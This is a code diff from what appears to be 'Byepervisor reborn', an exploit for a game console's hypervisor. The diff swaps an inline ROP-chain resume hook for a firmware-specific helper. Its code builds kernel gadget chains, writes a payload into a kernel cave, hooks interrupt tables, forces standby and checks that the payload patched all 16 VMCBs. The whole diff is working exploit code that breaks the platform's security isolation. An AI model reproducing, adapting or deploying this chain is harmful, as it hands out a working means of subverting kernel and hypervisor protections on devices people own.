@@ -9,6 +9,7 @@
 
 #include "kdlsym.h"
 #include "khook.h"
+#include "resume_hook_1140.h"
 #include "util.h"
 #include "paging.h"
 #include "dump.h"
@@ -73,69 +74,6 @@ static int install_test_hook(int core_id, uint64_t cave)
   return 0;
 }
 
-static int install_resume_hook(int core_id, uint64_t cave, uint64_t cr3)
-{
-  khook_t hook;
-  kh_chain_t chain;
-  uint8_t chain_buf[0x800];
-  uint64_t set_rsi;
-  uint64_t oracle;
-  int ret;
-
-  ret = kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
-  if (ret) return ret;
-
-  hook.tss_stride      = TSS_STRIDE;
-  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY), kdlsym(KERNEL_SYM_COMMON_TSS));
-  kh_set_core(&hook, core_id);
-  hook.oneshot   = 1;
-
-  set_rsi = kdldmap(STARTUP_MP_PAYLOAD_PAGE); // our payload
-  // set_rsi = ktext(0x269FB8); // original vector (13.60)
-
-  printf("[+] install_resume_hook: setting hook target = 0x%lx (base: 0x%lx), set rsi=0x%lx\n", kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL), ktext(0), set_rsi);
-  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL));
-  kh_set_resume_rsi(&hook, set_rsi);
-  kh_set_resume_rdx(&hook, cr3);
-
-  oracle = kh_user_data_addr(&hook);
-  kh_chain_init(&chain, chain_buf, sizeof chain_buf);
-  kh_chain_store(&chain, oracle, COOKIE_VAL);
-
-  kh_chain_g(&chain, KERNEL_GADGET_POP_RDX);
-  kh_chain_q(&chain, cr3);
-
-  kh_chain_g(&chain, KERNEL_GADGET_POP_RCX);
-  kh_chain_q(&chain, oracle + 0x08);
-  kh_chain_g(&chain, KERNEL_GADGET_ST_RCX_RDX);
-
-  kh_chain_memcpy(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE), kdlsym(KERNEL_SYM_DATA_CAVE) + 0x1000, 0xF00);
-
-  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF00), kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR));
-  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF08), kdldmap(0));
-  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF10), oracle);
-
-  // carveout addr
-  if (g_hv_base_pa == HV_LOADER_PA_PRO)
-    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF18), g_hv_base_pa - 0x800000);
-  else
-    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF18), g_hv_base_pa);
-
-  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF20), g_hv_base_pa + rawoff(HV_SYM_HEAP_BASE));
-  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF28), g_hv_base_pa + rawoff(HV_SYM_PCPUS));
-
-  ret = kh_install(&hook, &chain);
-  if (ret) return ret;
-
-  kh_trigger(&hook);
-  
-  kwrite64(cave + CAVE_SAVE_OFF + 0x00, hook.saved_gate_lo);
-  kwrite64(cave + CAVE_SAVE_OFF + 0x08, hook.saved_gate_hi);
-  kwrite64(cave + CAVE_SAVE_OFF + 0x10, hook.saved_ist);
-  kwrite64(cave + CAVE_STATE_OFF, STATE_ARMED);
-  return 0;
-}
-
 static void uninstall_hook(int core_id, uint64_t cave)
 {
   khook_t hook;
@@ -169,8 +107,6 @@ int main(void)
   uint64_t pdpe;
   uint64_t pde;
   uint64_t pte;
-  uint64_t o;
-
   printf("[+] Byepervisor reborn v1\n");
 
   // Do a quick firmware version detect, if we don't have offsets for it, goodbye!
@@ -283,9 +219,6 @@ int main(void)
 
 #else // !KHOOK_TEST
 
-  // Copy our payload that runs from startup_mp into kernel cave
-  kwrite(kdlsym(KERNEL_SYM_DATA_CAVE) + 0x1000, break_hv, break_hv_len);
-
   // Make the physical region executable in guest page tables
   kernel_pmap   = kdlsym(KERNEL_SYM_PMAP_STORE);
   kernel_pm_cr3 = kread64(kernel_pmap + 0x28);
@@ -328,44 +261,62 @@ int main(void)
     }
   }
 
-  // Install hook on startup_mp hypercall
-  printf("[+] Installing hook...\n");
-  if (kread64(cave + CAVE_STATE_OFF) != STATE_ARMED) {
-    int r = install_resume_hook(HOOK_CORE, cave, kernel_pm_cr3);
+  // Install isolated resume hook (avoids POP_R8/STORE_RCX_R8/OR_RCX_EAX)
+  printf("[+] Installing resume hook (11.40 isolated path)...\n");
+  if (!resume_hook_1140_is_armed(cave)) {
+    int r = resume_hook_1140_arm(cave, kernel_pm_cr3, g_hv_base_pa,
+                                 break_hv, break_hv_len);
     if (r) {
-      printf("[!] Failed to install hook (likely too large)\n");
-      notifyf("[ERROR] Byepervisor Reborn\nHook install failed :(");
+      printf("[!] Failed to install resume hook: %d\n", r);
+      notifyf("[ERROR] Byepervisor Reborn\nResume hook install failed: %d", r);
       return r;
     }
 
-    printf("[+] Hook installed, enter sleep and resume!\n");
+    printf("[+] Resume hook armed, entering rest mode in 3 secs!\n");
     notifyf("Byepervisor Reborn\nEntering rest mode in 3 secs\n");
     sleep(3);
     sceSystemStateMgrEnterStandby();
   } else {
-    printf("khook: hook already ARMED (state survived)\n");
+    printf("[+] Resume hook already armed (state survived)\n");
   }
 
-  // Poll for resume and hook trigger
+  // Poll for resume and hook trigger (AP payload writes MARK_ENTERED/MARK_DONE)
   for (;;) {
     pin_to_core(HOOK_CORE);
 
-    o = kread64(oracle);
-    if (o != 0) {
-      notifyf("Byepervisor Reborn\nWelcome back, hypervisor is defeated!\nCookie? 0x%lx", o);
-      
-      printf("[+] Uninstalling hook\n");
-      uninstall_hook(HOOK_CORE, cave);
+    uint64_t entered = kread64(oracle);
+    uint64_t done = kread64(oracle + 24);
+    if (entered == RESUME_1140_MARK_ENTERED && done == RESUME_1140_MARK_DONE) {
+      uint64_t stash = cave + RESUME_1140_STASH_OFF;
+      uint64_t ap_error = kread64(stash);
+      uint64_t written = kread64(stash + 0x40);
+      uint64_t verified = kread64(stash + 0x48);
+
+      printf("[+] AP payload completed: error=%lu written=%lu verified=%lu\n",
+             (unsigned long)ap_error, (unsigned long)written,
+             (unsigned long)verified);
+
+      if (ap_error == 0 && written == 16 && verified == 16) {
+        notifyf("Byepervisor Reborn\nHypervisor defeated! 16/16 VMCBs patched");
+      } else {
+        notifyf("Byepervisor Reborn\nAP payload error=%lu w=%lu v=%lu",
+                (unsigned long)ap_error, (unsigned long)written,
+                (unsigned long)verified);
+      }
+
+      printf("[+] Cleaning up resume hook\n");
+      resume_hook_1140_cleanup(cave);
 
       test_val = kread64(ktext(0));
       test_val_bytes = (uint8_t *) &test_val;
-      notifyf("Byepervisor Reborn - Kernel .text first 8 bytes\n%02x %02x %02x %02x %02x %02x %02x %02x", 
-      test_val_bytes[0], test_val_bytes[1], test_val_bytes[2], test_val_bytes[3], 
+      notifyf("Byepervisor Reborn - Kernel .text first 8 bytes\n%02x %02x %02x %02x %02x %02x %02x %02x",
+      test_val_bytes[0], test_val_bytes[1], test_val_bytes[2], test_val_bytes[3],
       test_val_bytes[4], test_val_bytes[5], test_val_bytes[6], test_val_bytes[7]);
 
-      // TODO: Patch kernel and all that fun stuff, we don't feel like doing this so someone else can do it :)
-
       return 0;
+    } else if (entered != 0) {
+      printf("[!] AP payload partial: entered=0x%lx done=0x%lx\n",
+             (unsigned long)entered, (unsigned long)done);
     }
 
     sceKernelSleep(5);
